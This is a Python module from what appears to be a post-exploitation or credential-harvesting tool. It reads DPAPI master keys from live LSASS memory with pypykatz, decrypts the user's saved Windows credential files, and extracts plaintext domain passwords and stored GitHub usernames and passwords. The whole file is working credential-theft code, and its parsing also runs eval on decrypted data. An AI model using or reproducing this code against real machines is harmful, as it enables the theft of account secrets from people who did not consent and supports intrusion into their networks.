from pypykatz.pypykatz import pypykatz
from pypykatz.dpapi.dpapi import DPAPI
import json
import glob
import os

class credential:
    def __init__(self):
        self.USERPROFILE=os.environ['USERPROFILE']
        self.cred_file_path=self.USERPROFILE+"\\AppData\\Local\\Microsoft\\Credentials\\*"

    def get_secret_data(self):
        secret_data=[]
        cred_file_list=glob.glob(self.cred_file_path)
        if cred_file_list:
            for cred_file in cred_file_list:
                cred_data=self.decrypt_cred_file(cred_file)
                if cred_data:
                    secret_data.append(cred_data)
        return secret_data

    def decrypt_cred_file(self,cred_filename):
        dpapi = DPAPI()
        dpapi.get_masterkeys_from_lsass_live()

        cred_blob=dpapi.decrypt_credential_file(cred_filename)
        data_list=self.to_dict(cred_blob.to_text())
        
        cred_data={}
        if 'type' in data_list and data_list['type']=="DOMAIN_PASSWORD (2)":
            if 'username' in data_list and 'unknown4' in data_list and 'target' in data_list:
                cred_data['type']="DOMAIN_PASSWORD"
                cred_data['target']=data_list['target']
                cred_data['username']=data_list['username']
                cred_data['password']=eval(data_list['unknown4'].replace("\\\\","\\")).decode('utf-16-le')
        
        if 'type' in data_list and data_list['type']=="GENERIC (1)":
            if 'username' in data_list and 'unknown4' in data_list and 'target' in data_list and data_list['target']=='LegacyGeneric:target=git:https://github.com':
                cred_data['type']="github"
                cred_data['target']=data_list['target']
                cred_data['username']=data_list['username']
                cred_data['password']=eval(data_list['unknown4'].replace("\\\\","\\")).decode('utf-16-le')

        return cred_data
        

    def to_dict(self,text):
        dic={}
        text_list=text.split('\r\n')
        for line in text_list:
            value=line.strip().split(':',1)
            if len(value)>1:
                dict_key=value[0].strip().strip(b'\x00'.decode())
                dict_value=value[1].strip().strip(b'\x00'.decode())
                dic[dict_key]=dict_value
        return dic

    def get_result(self, secret_data):
        desc="Decrypt saved credentials"
        result={}
        result['desc']=desc
        result['data']=secret_data
        return result

    def run(self, target_list):
        result=[]
        if 'credential' in target_list:
            secret_data=self.get_secret_data()
            cred_result=self.get_result(secret_data)
            result.append(cred_result)
        return result